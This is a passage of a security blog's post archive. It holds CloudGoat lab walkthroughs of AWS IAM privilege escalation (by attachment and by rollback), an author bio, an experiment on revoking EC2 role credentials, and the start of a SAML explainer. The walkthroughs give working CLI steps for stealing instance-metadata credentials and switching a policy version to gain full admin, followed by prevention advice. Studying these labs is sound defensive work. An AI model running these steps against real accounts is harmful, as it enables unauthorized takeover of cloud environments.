describe-security-groups Looking at the output we can see that there is already a group that fits our needs, it allows SSH from an IP address that we have access to.\nWe know that the super critical server has a public IP address, we also have the subnet for that instance. We can use that subnet-id when we create our new instance.\nAt this point We have all of the pieces that we need to create an instance that we will have access to (hopefully).\nssh key: totes-legit security group ids: sg-0594794cf09e47456 subnet id: subnet-0157cfe78e8beca7a image-id: ami-0a313d6098716f372 instance-type: t2.micro Time to create an instance: aws --profile kerrigan ec2 run-instances --image-id=ami-0a313d6098716f372 --count=1 --instance-type=t2.micro --security-group-ids=subnet-01a29bf90aca8c8d9 --subnet-id=subnet-0157cfe78e8beca7a --key-name=totes-legit --tags Key=Name,Value=totes-legit When this is successful all of the data bout our instance is returned. This includes our instance id, ip information, and current state. and returns our instance id.\n\u0026#34;InstanceId\u0026#34;: \u0026#34;i-06f3f5f9f8cdc9c6e\u0026#34; Unfortunatly, we don\u0026rsquo;t seem to have a public IP address for our instance. Did something go wrong? Nope, the current stat of the instance was \u0026lsquo;pending\u0026rsquo;. We need to check back in on the instance an wait for the state to change to \u0026lsquo;running\u0026rsquo;. Once its running, we should also have public IP address information. We can do this with the describe-instances command.\naws --profile kerrigan ec2 describe-instances --instance-id=i-06f3f5f9f8cdc9c6e The output from the command in the picture above shows that the instance is \u0026lsquo;running\u0026rsquo; and that we have a public IP.\n\u0026#34;PublicIpAddress\u0026#34;: \u0026#34;18.232.65.212\u0026#34; Now we can ssh into the box using our totes-legit key:\nssh -i ~/.ssh/totes-legit ubuntu@18.232.65.212 Now we can query the meta data service and extract the instance keys, or we could run commands directly through this ec2. Lets grab the keys.\ncurl http://169.254.169.254/latest/meta-data/iam/ Weird, looking at the output below we get a 404 error and no access keys. What could cause that?\nMore Power Looking back at what we\u0026rsquo;ve done.\nWe found an instance profile We disassociated a role with the instance profile We associated a new role with the instance profile We created an ec2 instance that we have access to. Something we have not done yet, associate an instance profile with our instance. This profile is how our instance gains privileges. Remeber, an ec2 can have an instance profile associated with it. That profile can have 1 role associated with it, and that role can have policies attached to it.\nLets assign a profile to our instance. We\u0026rsquo;ll need our instance Id, and the meek-instance profile name we discovered earlier.\naws --profile kerrigan ec2 associate-iam-instance-profile --instance-id=i-06f3f5f9f8cdc9c6e --iam-instance-profile Name=cg-ec2-meek-instance-profile-cgidawtm15fqxm Once the command is executed we\u0026rsquo;ll see an output similar to the one below with a state of associating\nAfter a minute or two we can check back in on our instsance and attempt to curl for credentials again:\ncurl http://169.254.169.254/latest/meta-data/iam/ The output has changed, from a 404 error to the one below.\nDigging deeper into the meta data we can find an AccessKey, SecretAcessKey, and a Token needed to access the aws api\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-cgidawtm15fqxm We have a few options at this point:\nTake the access key information and run aws cli commands from our workstation Install/use the aws cli on the instance we control to run commands Use the pacu proxy Each of these has there own benefits and draw backs. If we steal the keys and use them locally, we run the risk of triggering Guard Duty. We could spin up an ec2 in our own account to prevent Guard Duty from alerting, but thats not necessary for this walkthrough. If we install the aws cli and issue commands we run the risk of losing access to the box. The same issue presents itself if we use the Pacu proxy.\nWe\u0026rsquo;ll go ahead and run the risk of losing access, and install the aws cli on our instance.\nOnce its install we can validate that we have working credentials:\nsts get-caller-identity Perfect we have no pivoted from the kerrigan user to whatever permissions we have through the new mighty role. We should use our new abilities to see if we can determine the full extent of the mighty role.\naws iam list-attached-role-policies --role-name=cg-ec2-mighty-role-cgidawtm15fqxm and thankfully, it looks like we have some measure of IAM privileges because the output from that command shows us the policy associated with the role:\nPerhaps we have the ability to also see the configuration of that policy. Fist we\u0026rsquo;ll pull in some general information about the policy:\naws iam get-policy --policy-arn=arn:aws:iam:::policy/cg-ec2-mighty-policy Looking at the output above we are currently using policy version v1.\nWe can now get the configuration of the policy with:\naws iam get-policy-version --policy-arn=arn:aws:iam:::policy/cg-ec2-mighty-policy --version-id=v1 The output shows that we can take any action Action: * and we can access any resource Resource: *. Through this ec2 instance with the mighty role we are effectivly and administrator within this account. We can do anything that we would like.\nPrevention So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.\nThe first and probably the biggest is does the Kerrigan user need a static key? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid. In this scenario specifically if we did not have the Kerrigan access key then this attack would have failed right out of gate. Does Kerrigan need this level of access? Looking at the policy: { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;VisualEditor0\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;iam:ListRoles\u0026#34;, \u0026#34;iam:PassRole\u0026#34;, \u0026#34;iam:ListInstanceProfiles\u0026#34;, \u0026#34;iam:AddRoleToInstanceProfile\u0026#34;, \u0026#34;iam:RemoveRoleFromInstanceProfile\u0026#34;, \u0026#34;ec2:AssociateIamInstanceProfile\u0026#34;, \u0026#34;ec2:DescribeIamInstanceProfileAssociations\u0026#34;, \u0026#34;ec2:RunInstances\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; }, { \u0026#34;Sid\u0026#34;: \u0026#34;VisualEditor1\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;ec2:CreateKeyPair\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; }, { \u0026#34;Action\u0026#34;: [ \u0026#34;ec2:DescribeInstances\u0026#34;,\u0026#34;ec2:DescribeVpcs\u0026#34;, \u0026#34;ec2:DescribeSubnets\u0026#34;, \u0026#34;ec2:DescribeSecurityGroups\u0026#34; ], \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] } This policy grants a lot of access, and a lot of it probably isnt necessary. The iam permissions could probably go away. But, perhaps they\u0026rsquo;re needed for an automation. What if the kerrigan keys are designed to spin up Ec2 instances, each has there own unique ssh key, and each need to have the same Instance profile associated with it so that it can access S3. If thats the case some of these permissions make sense. But we could still remove ListRoles, PassRole, ListInstanceProfiles, RemoveRoleFromInstanceProfile, DescribeiamInstanceProfileAssociations. These permissions were critical for us to be able to pivot from Kerrigan to an instance with mighty permissions.\nThe mighty role should probably just not exist at all. This would be an interesting discussion with the stakeholders to understand the purpose of this role. Perhaps there is a valid reason for it, but more than likely this could have permissions scoped in and not given full administrative rights to the account. Proper detections could also help. While they might not prevent the entire attack, they may help to slow everything down. If the Cloudtrail logs were baselined, and examined our activities would probably stick out. Our enumeration was very loud, we made hundereds of calls over a short period of time. Additionally we probably made calls that the Kerrigan never makes. This would allow a SOC to have a heads up of the malicious activity and begin investigating. ","permalink":"https://jellyparks.com/posts/iam-privesc-by-attachment/","summary":"Cloud Goat IAM priviledge escalation by attachment scenario walkthrough","title":"iam_privesc_by_attachment"},{"content":" According to the official documentation for this scenario (here) the overall goal is to \u0026ldquo;Acquire full admin privileges.\u0026rdquo;\nWe can create the challenge by running\npython3 cloudgoat.py create iam_privesc_by_rollback The build process will begin and when it finishes we will be provided with a set of credentials for the Raynor user account.\nRaynor In the real world, we probably wouldn\u0026rsquo;t just be handed these credentials. However, people make mistakes and credentials are often accidentally exposed. Let\u0026rsquo;s start doing basic enumeration and see if we can determine what things we have access to. To do this we\u0026rsquo;ll run the following set of commands just to poke at a few of the more common services:\naws --profile solus s3 ls aws --profile solus ec2 describe-instances aws --profile solus iam list-roles aws --profile solus lambda list-functions All of the api calls fail with the exeption being iam list-roles. We can clean the output up by using jq:\naws --profile raynor iam list-roles | jq \u0026#39;.Roles[].RoleName\u0026#39; This command will produce an output similar to the one below.\nThe key takeaway here is that we have access to a user account with some level of IAM permissions. How much access do we have? One way to find out is by leveraging Pacu to bruteforce those permissions for us. The other option is to make iam calls one at a time to determine where our limits may exist. For this example we\u0026rsquo;ll leverage Pacu and run the iam__enum_users_roles_policies_groups module.\nrun iam__enum_users_roles_policies_groups Once the module finishes its execution we see that it successfully enumeated various aspects of the account.\nWe can run the data IAM command to see information associated with the enumeration. At first glance of the policies it appears there is a specific policy listed for our user account: cg-raynor-policy\n\u0026#34;Policies\u0026#34;: [ { \u0026#34;PolicyName\u0026#34;: \u0026#34;cg-raynor-policy\u0026#34;, \u0026#34;PolicyId\u0026#34;: \u0026#34;ANPA5X73I5MBNC3PRT6CO\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::121212121212:policy/cg-raynor-policy\u0026#34;, \u0026#34;Path\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;DefaultVersionId\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;AttachmentCount\u0026#34;: 1, \u0026#34;IsAttachable\u0026#34;: true, \u0026#34;CreateDate\u0026#34;: \u0026#34;Mon, 25 May 2020 14:24:46\u0026#34;, \u0026#34;UpdateDate\u0026#34;: \u0026#34;Mon, 25 May 2020 14:24:48\u0026#34; } ], Looking at the details above we can also tell that the policy is curently attached AttachmentCount: 1 and the version being used is v1 DefaultVersionId: v1. If we wanted to leverage the aws cli in place of Pacu we could run the command below. The command is filtering to show only those policies which are currently attached to a resource.\naws --profile raynor iam list-policies --only-attached --scope Local { \u0026#34;Policies\u0026#34;: [ { \u0026#34;PolicyName\u0026#34;: \u0026#34;cg-raynor-policy\u0026#34;, \u0026#34;PolicyId\u0026#34;: \u0026#34;ANPA5X73I5MBNC3PRT6CO\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::121212121212:policy/cg-raynor-policy\u0026#34;, \u0026#34;Path\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;DefaultVersionId\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;AttachmentCount\u0026#34;: 1, \u0026#34;PermissionsBoundaryUsageCount\u0026#34;: 0, \u0026#34;IsAttachable\u0026#34;: true, \u0026#34;CreateDate\u0026#34;: \u0026#34;2020-05-25T14:24:46Z\u0026#34;, \u0026#34;UpdateDate\u0026#34;: \u0026#34;2020-05-25T14:24:48Z\u0026#34; } ] } The next question we have to answer is the policy attached to our user account? We can do that by quering the list-attached-user-policies endpoint and our user name raynor. An example command and output is below.\naws --profile raynor iam list-attached-user-policies --user-name raynor { \u0026#34;AttachedPolicies\u0026#34;: [ { \u0026#34;PolicyName\u0026#34;: \u0026#34;cg-raynor-policy\u0026#34;, \u0026#34;PolicyArn\u0026#34;: \u0026#34;arn:aws:iam::121212121212:policy/cg-raynor-policy\u0026#34; } ] } Versions Good news, it appears the raynor policy is currently associated with the raynor user account. Lets see if we can learn more about what we are allowed to do and what we are not allowed to do. We can accomplish this by making a call to the get-policy-version endpoint as seen below.\naws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v1 { \u0026#34;PolicyVersion\u0026#34;: { \u0026#34;Document\u0026#34;: { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;IAMPrivilegeEscalationByRollback\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;iam:Get*\u0026#34;, \u0026#34;iam:List*\u0026#34;, \u0026#34;iam:SetDefaultPolicyVersion\u0026#34; ], \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] }, \u0026#34;VersionId\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;IsDefaultVersion\u0026#34;: true, \u0026#34;CreateDate\u0026#34;: \u0026#34;2020-05-25T14:24:46Z\u0026#34; } } For the call to work we specified the policy arn as well as the version currently applied. From the output it looks like we can make calls to iam resources if they are a Get, List, or SetDefaultPolicyVersion. That last one is interesting. Perhaps our currently policy has more than one version? Let\u0026rsquo;s check to see if version 2 of our policy exists. The results are below:\naws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v2 { \u0026#34;PolicyVersion\u0026#34;: { \u0026#34;Document\u0026#34;: { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Action\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] }, \u0026#34;VersionId\u0026#34;: \u0026#34;v2\u0026#34;, \u0026#34;IsDefaultVersion\u0026#34;: false, \u0026#34;CreateDate\u0026#34;: \u0026#34;2020-05-25T14:24:48Z\u0026#34; } } Interesting, a version 2 of the policy does exist, and it gives full admin access to the entire account. Our current policy provides us with the ability to set the default version of a policy. If we were to change the default version of the policy currently applied to our user account from 1 to 2 we could escalate our privledges to full admin.\nThe command below will accomplish this.\naws --profile raynor iam set-default-policy-version --policy arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v2 If successful there will be no response. We can validate the command was successful by re-running the list-policies command:\naws --profile raynor iam list-policies --only-attached --scope Local { \u0026#34;Policies\u0026#34;: [ { \u0026#34;PolicyName\u0026#34;: \u0026#34;cg-raynor-policy\u0026#34;, \u0026#34;PolicyId\u0026#34;: \u0026#34;ANPA5X73I5MBNC3PRT6CO\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::121212121212:policy/cg-raynor-policy\u0026#34;, \u0026#34;Path\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;DefaultVersionId\u0026#34;: \u0026#34;v2\u0026#34;, \u0026#34;AttachmentCount\u0026#34;: 1, \u0026#34;PermissionsBoundaryUsageCount\u0026#34;: 0, \u0026#34;IsAttachable\u0026#34;: true, \u0026#34;CreateDate\u0026#34;: \u0026#34;2020-05-25T14:24:46Z\u0026#34;, \u0026#34;UpdateDate\u0026#34;: \u0026#34;2020-05-25T18:28:50Z\u0026#34; } ] } Notice the default version has changed from v1 to v2. At this point we have full administrative rights to this aws account.\nPrevention So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.\nThe most important is to not expose credentials. If we were not able to leverage raynors credentials we would not have been able to authenticate and further escalate privileges. Limit what users can do. The policy associated with raynor allowed for too much access. I imagine in the real world a user with this set of actions at there disposal would likely have much more persmissions within the account. ","permalink":"https://jellyparks.com/posts/iam-privesc-by-rollback/","summary":"Cloud Goat IAM priviledge escalation by rollback scenario walkthrough","title":"iam_privesc_by_rollback"},{"content":"My Current Work Primarily focused on driving changes in the SOC to better monitor and maintain our cloud security posture. Successfully built, tuned, and deployed an AWS cloud anomaly detection platform based on CloudTrail events. Built several other custom pieces of cloud content and automations. Integrated our SOAR platform with AWS environments to automate IR and Forensic capabilities. Mentor members of the security team to better understand the cloud and container spaces.\nTalks and Workshops Talks:\n2019 BsidesKC - XSS UI Redressing Workshops:\n2018 OzSec, Kansas - Held the all day hands on \u0026lsquo;hacking workshop\u0026rsquo; which covered an introduction to offensive security tools Certifications AWS Solution Architect - Associate GPEN CISSP Security+ Microsoft Office User Specialist (MOUS) - Access 2000 Continuing Education SANS: SEC642 Advanced Web Application Penetration Testing SANS: SEC560 Network Penetration Testing and Ethical Hacking SANS: ICS410 ICS/SCADA Security Essentials Technical Proficiencies AWS multi cloud environments Kubernetes Docker/Containers git Windows Linux O365 Terraform Python JavaScript SAML Active Directory Penetration Testing Splunk ELK EDR Solutions GitLab Devops Wide array of offensive security tools Wide array of defensive security tools ","permalink":"https://jellyparks.com/posts/me/","summary":"My Current Work Primarily focused on driving changes in the SOC to better monitor and maintain our cloud security posture. Successfully built, tuned, and deployed an AWS cloud anomaly detection platform based on CloudTrail events. Built several other custom pieces of cloud content and automations. Integrated our SOAR platform with AWS environments to automate IR and Forensic capabilities. Mentor members of the security team to better understand the cloud and container spaces.","title":"me"},{"content":" The conversation came up about revoking credentials for a role associated which had ec2 instances associated with it. Does it impact the instance at all? When will the instance refresh its access keys? Is there just a blip in the EC2\u0026rsquo;s access to AWS API calls or is it unable to make calls until its keys TTL ends? These were all questions that we did not know the answer to. The official Amazon docs here and here don\u0026rsquo;t necessarily cover the fall out or recovery from this action.\nYou may ask yourself, if an EC2 instance with a role associated with it was compromised why would you want to revoke credentials from it and then turn around and provide the instance with a new set of keys and the same level of access it previously had? This is a valid point, but sometimes the business needs a service running. Perhaps it is making lots of money, or perhaps it is high visibility to the businesses brand. Sometimes the only choice which makes sense is to try and mitigate the issue without impacting production.\nThe Setup For the experiement below I have an EC2 instance with a role that permits it to access S3. The process flow is:\nQuery S3 validate everything is working Revoke active sessions for the role, we should see the S3 queries begin to fail Remove the instance profile from the instance, our access key should change, and S3 queries should continue to fail Reapply the instance profile granting s3 access, our acess key should change once again, and the S3 queries should be successful Test 1 I built a python script to query the meta data service, determine the pertinent information about the access key currently associated with the instance, leverage boto3 to make a call to s3 and list the buckets. The script counts the number of buckets and prints all of the information to the screen if successful. If the script fails it shows the key and a failure message. The first script is below:\nimport requests import boto3 import time import sys def main(): try: while True: s3_client = boto3.client(\u0026#39;s3\u0026#39;) response = requests.get(\u0026#39;http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/\u0026#39;) response = response.json() expiration = response[\u0026#39;Expiration\u0026#39;] last_update = response[\u0026#39;LastUpdated\u0026#39;] token = response[\u0026#39;Token\u0026#39;] accesskey = response[\u0026#39;AccessKeyId\u0026#39;] try: s3_response = s3_client.list_buckets() number_of_buckets = len(s3_response[\u0026#39;Buckets\u0026#39;]) response_code = s3_response[\u0026#39;ResponseMetadata\u0026#39;][\u0026#39;HTTPStatusCode\u0026#39;] print(f\u0026#39;AccessKeyId: {accesskey} -- Expiration: {expiration} -- LastUpdated: {last_update} -- ResponseCode: {response_code} -- NumberofBuckets: {number_of_buckets}\u0026#39;) except: print(f\u0026#39;Keys no longer valid -- AccessKeyId: {accesskey} -- Expiration: {expiration} -- LastUpdated: {last_update}\u0026#39;) pass time.sleep(1) except KeyboardInterrupt: print(\u0026#39;\\n Bye\u0026#39;) sys.exit() if __name__ == \u0026#34;__main__\u0026#34;: main() I started the script above, and everything seemed to be working as expected. What is interesting about this script is that didn\u0026rsquo;t have the initial outcome I expected. Despite the meta-data service showing a refresh to the keys, it apepared that boto3 did not. It acted as if everything was a single session. In my initial coding of the script I assumed that since I was creating a new client with each call this would not have been a problem. To work around the problem I reworked the script.\nTest 2 For test 2 I modifed the code to manually define the credentials for the s3 client (lines 16-21) by using the values from the meta data response.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import requests import boto3 import time import sys def main(): try: while True: response = requests.get(\u0026#39;http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/\u0026#39;) response = response.json() expiration = response[\u0026#39;Expiration\u0026#39;] last_update = response[\u0026#39;LastUpdated\u0026#39;] token = response[\u0026#39;Token\u0026#39;] secret = response[\u0026#39;SecretAccessKey\u0026#39;] accesskey = response[\u0026#39;AccessKeyId\u0026#39;] s3_client = boto3.client( \u0026#39;s3\u0026#39;, aws_access_key_id=accesskey, aws_secret_access_key=secret, aws_session_token=token) ) try: s3_response = s3_client.list_buckets() number_of_buckets = len(s3_response[\u0026#39;Buckets\u0026#39;]) response_code = s3_response[\u0026#39;ResponseMetadata\u0026#39;][\u0026#39;HTTPStatusCode\u0026#39;] print(f\u0026#39;AccessKeyId: {accesskey} -- Expiration: {expiration} -- LastUpdated: {last_update} -- ResponseCode: {response_code} -- NumberofBuckets: {number_of_buckets}\u0026#39;) except: print(f\u0026#39;Keys no longer valid -- AccessKeyId: {accesskey} -- Expiration: {expiration} -- LastUpdated: {last_update}\u0026#39;) pass time.sleep(1) except KeyboardInterrupt: print(\u0026#39;\\n Bye\u0026#39;) sys.exit() if __name__ == \u0026#34;__main__\u0026#34;: main() Once again, this failed. Unexpectidly it still appeared that the boto client was retaining the original credentials. After doing some digging it appears that this is true, even though I am setting the credentials with each iteration, boto3 apparently still caches the session. The only way to work around this is to create a new session with botocore.\nTest 3 I rewrote the script to leverage botocore.session and ended up with the code below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import requests import boto3 import time import sys def main(): try: while True: response = requests.get(\u0026#39;http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/\u0026#39;) response = response.json() expiration = response[\u0026#39;Expiration\u0026#39;] last_update = response[\u0026#39;LastUpdated\u0026#39;] token = response[\u0026#39;Token\u0026#39;] secret = response[\u0026#39;SecretAccessKey\u0026#39;] accesskey = response[\u0026#39;AccessKeyId\u0026#39;] s3_session = \u0026#39;\u0026#39; s3_session = botocore.session.get_session() s3_client = s3_session.create_client(\u0026#39;s3\u0026#39;, region_name=\u0026#39;us-east-1\u0026#39;) try: s3_response = s3_client.list_buckets() number_of_buckets = len(s3_response[\u0026#39;Buckets\u0026#39;]) response_code = s3_response[\u0026#39;ResponseMetadata\u0026#39;][\u0026#39;HTTPStatusCode\u0026#39;] print(f\u0026#39;AccessKeyId: {accesskey} -- Expiration: {expiration} -- LastUpdated: {last_update} -- ResponseCode: {response_code} -- NumberofBuckets: {number_of_buckets}\u0026#39;) except: print(f\u0026#39;Keys no longer valid -- AccessKeyId: {accesskey} -- Expiration: {expiration} -- LastUpdated: {last_update}\u0026#39;) pass time.sleep(1) except KeyboardInterrupt: print(\u0026#39;\\n Bye\u0026#39;) sys.exit() if __name__ == \u0026#34;__main__\u0026#34;: main() Now when I ran the script, each new loop was ACTUALLY get new credentials and not leveraging cached ones. The process worke just as it should and I recieved the outputs below as I progressed through each stage.\nAccessKeyId: ASIA4NX323S76LIV -- Expiration: 2020-07-04T20:23:29Z -- LastUpdated: 2020-07-04T14:13:19Z -- ResponseCode: 200 -- NumberofBuckets: 9 Revoke the role credentials in IAM.\nKeys no longer valid -- AccessKeyId: ASIA4NX323S76LIV -- Expiration: 2020-07-04T20:23:29Z -- LastUpdated: 2020-07-04T14:13:19Z -- Exception: An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied Remove the role to generate a new set of credentials instead of waiting for the old credentials to expire sometime within the next 12 hours.\nKeys no longer valid -- AccessKeyId: ASIA4NX325UZ6YFR -- Expiration: 2020-07-04T20:25:21Z -- LastUpdated: 2020-07-04T14:16:02Z -- Exception: Unable to locate credentials Re-apply the role to the ec2 instance and generate yet another set of credentials.\nAccessKeyId: ASIA4NX3WW2QDQ5K -- Expiration: 2020-07-04T20:42:54Z -- LastUpdated: 2020-07-04T14:17:33Z -- ResponseCode: 200 -- NumberofBuckets: 9 Key Takeaways The behavior of the scripts was very interesting and should not be taken lightly. I would assume there is a high chance that any scripts running on an EC2 instance would be written in a way similar to the script in the first test. If as an IR team we revoked the credentials for the role (due to compromise), removed the instance profile, and then reapplied the profile in an effort to maintain \u0026lsquo;uptime\u0026rsquo; for the business process it may still cause an outage because the client has cached credentials.\nRebooting the instance may fix this issue, but at that point you\u0026rsquo;ve still rebooted the instance potentially causing an outage. Obviously the best case scenario is to fully remediate before having the instance available again, but sometimes the businesses needs outweigh the risk.\n","permalink":"https://jellyparks.com/posts/role-credential-revoking/","summary":"IAM roles can have all current credentials revoked. This can be great to stop an attacker, but at what cost?","title":"role_credential_revoking"},{"content":" What is it According to RFC7522 \u0026ldquo;the Security Assertion Markup Language (SAML) 2.0 is an XML-based framework that alllows identity and security information to be shared across security domains.\u0026rdquo; In a nutshell SAML provides a way to tell a web application you are who you say you are without having to maintain a user/password database within each web application users access. Instead the authentication occurs at a trusted identity provider (IDP) and authorization is left to the web application which people are trying to access once they authenticate with the IDP.\nTerms:\nIdentity Provider (IDP): This is the server that handles the authentication. In the test environment below the IDP is the \u0026lsquo;Jellystone IDP.\u0026rsquo; This is the platform you prove you are who you say you are. An IDP may have back end connections to AD, or it could check against another database of users. IDPs can also help to easily implment mutli-factor authentication. Removing the burden from the application developer. Service Provider (SP): This is the application a user is attempting to access. In the case of the example below the SP is \u0026lsquo;Yogi\u0026rsquo;s SAML App\u0026rsquo;. Client: This is you. A client is anyone or anything that is sending a request to the SP. How Does it Work SAML has a couple different authentication flows, the IDP initiated flow and the service provider initiated flow. Once the user reaches the IDP the flows are basically the same. For this writeup we will focus on the service provider initiated flow. Looking at the picture below we can see three high level steps for this flow.\nLets break these down:\n1 - In this step the user browses to the web application (Service Provider) and selects the login button. 2 - The web application sends SAML request back to the browser and redirects it to the IDP. The browser relays the request to the IDP. The IDP prompts to user to to authenticate. With the defined requirements. This could be a username/password, MFA, both, etc. 3 - Once the user proves they are who they say they are the IDP generates a SAML assertion and sends it back to the browser and redirects the browser back to the Service Provider. The service provider confirms that the user should have access to the application and grants them access to resources they are allowed to access.\nThe assertion messages which is provided to the Service Provider is the most important thing to secure. This can be done by configuring the Service Provider so confirm that the messages from the IDP that are relayed through the user are signed, and valid. More often than not this is where security issues arise.\nIf the messages are not signed, or are signed but not valid the application should reject them. For example the three attacks below should all result in an assertion message being rejected:\nAttacker removes the signature and edits the message - Unsigned message Attacker leaves the signature and edits the message - Signed but not valid message Attacker edits the message and resigns it - Signed but not valid message/signature Message Breakdown Request: I\u0026rsquo;d Like to Login GET /?sso2 HTTP/1.1\rHost: http://yogivulnerablesaml.jellystone.com:8000\rUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate\rReferer: http://yogivulnerablesaml.jellystone.com:8000/\rConnection: close\rUpgrade-Insecure-Requests: 1 Response: Sure heres some information, go auth to this IDP HTTP/1.1 302 FOUND\rContent-Type: text/html; charset=utf-8\rContent-Length: 1795\rLocation: http://idp.jellystone.com/simplesamlphp/saml2/idp/SSOService.php?SAMLRequest=fVNNj9owEL3vr0C59ETsOMBmLUhFoR9IFCKSVmovlbGHxVJip7azS%2F99nYSltOriQyzNzHvz%2FGYytawqazpv3FHt4GcD1t0N%2FDlVpbK0S86CxiiqmZWWKlaBpY7TfP55TUmIaW2001yXwT%2Bw2yhmLRgntephq%2BUs2G7er7cfV5sfJOZjwkWCWUSAPMR7IGx0EII8sEk8IYLsR3Fyn0AP%2FQrGep5Z4Gn7SGb0kxRgNr7rLPimH%2BUbO8izcydrG1gp65hyHoMJHuLJkEyKaEJxREn0va9beiOkYq6jPjpXU4SiJCQxCcdRGOF7ZGVVl9A5dKxRexMkRY3yfJuDeZIcQp%2B4SOpMeieVkOrxtjf7vsjST0WRDbNtXvQk8xfPFlrZpgJzbvNlt75IjL3CcRglJBzRBGOM3jJue3jafaetUNq5YNLXQBU4JphjaIquy%2F8Q1LQ1d7XMdCn5ry7eng%2FaVMy9%2FjpvXBeRYnjoSmmjbA1cHiSI4EIzL0v9vDDAnJ%2BfMw0EA%2FRX8%2FOigujW1tvh4OQGC13VzEjbTgxOjLsgvVD2z74uX5R%2BB3dwSG%2BuKae8rfPhzF%2FP2oh2lMB978IwL14bdzbpv%2BS9anRDdnr3kr7%2BB9Pf\u0026amp;RelayState=http%3A%2F%2Fyogivulnerablesaml.jellystone.com%3A8000%2Fprofile%2F The SAMLRequest parameter in the response above is a base64 encoded xml payload. If we decode it we get the information below:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;samlp:AuthnRequest AssertionConsumerServiceURL=\u0026#34;http://yogivulnerablesaml.jellystone.com:8000/?acs\u0026#34; Destination=\u0026#34;http://idp.jellystone.com/simplesamlphp/saml2/idp/SSOService.php\u0026#34; ID=\u0026#34;ONELOGIN_23c52cd80a12e293be2a4fdd29a6362d2b43878e\u0026#34; IssueInstant=\u0026#34;2020-06-26T16:01:21Z\u0026#34; ProtocolBinding=\u0026#34;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\u0026#34; ProviderName=\u0026#34;Yogi\u0026#39;s SP\u0026#34; Version=\u0026#34;2.0\u0026#34; xmlns:saml=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34; xmlns:samlp=\u0026#34;urn:oasis:names:tc:SAML:2.0:protocol\u0026#34;\u0026gt; \u0026lt;saml:Issuer\u0026gt; http://yogivulnerablesaml.jellystone.com:8000/metadata/ \u0026lt;/saml:Issuer\u0026gt; \u0026lt;samlp:NameIDPolicy AllowCreate=\u0026#34;true\u0026#34; Format=\u0026#34;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\u0026#34;/\u0026gt; \u0026lt;samlp:RequestedAuthnContext Comparison=\u0026#34;exact\u0026#34;\u0026gt; \u0026lt;saml:AuthnContextClassRef\u0026gt; urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport \u0026lt;/saml:AuthnContextClassRef\u0026gt; \u0026lt;/samlp:RequestedAuthnContext\u0026gt; \u0026lt;/samlp:AuthnRequest\u0026gt; Once we\u0026rsquo;ve decoded the payload there isn\u0026rsquo;t much to it. Rember at this point in the process the user has not authenticated yet, they have just started the process. The payload above is what the Service Provider gives to the user to then provide to the Identity Platform. Let\u0026rsquo;s break down the three fields highlighted above:\nAssertionConsumerServiceURL: This field is the return address. Basically this is where we tell the IDP to point us to once we\u0026rsquo;ve successfully authenticated. ID: This field is a transaction ID for this entire login request. Its how the service provider knows which session to attribute our authenticate request to. It becomes important later. ProviderName: If this is filled in, its just the name of the SP. From a logging standpoint 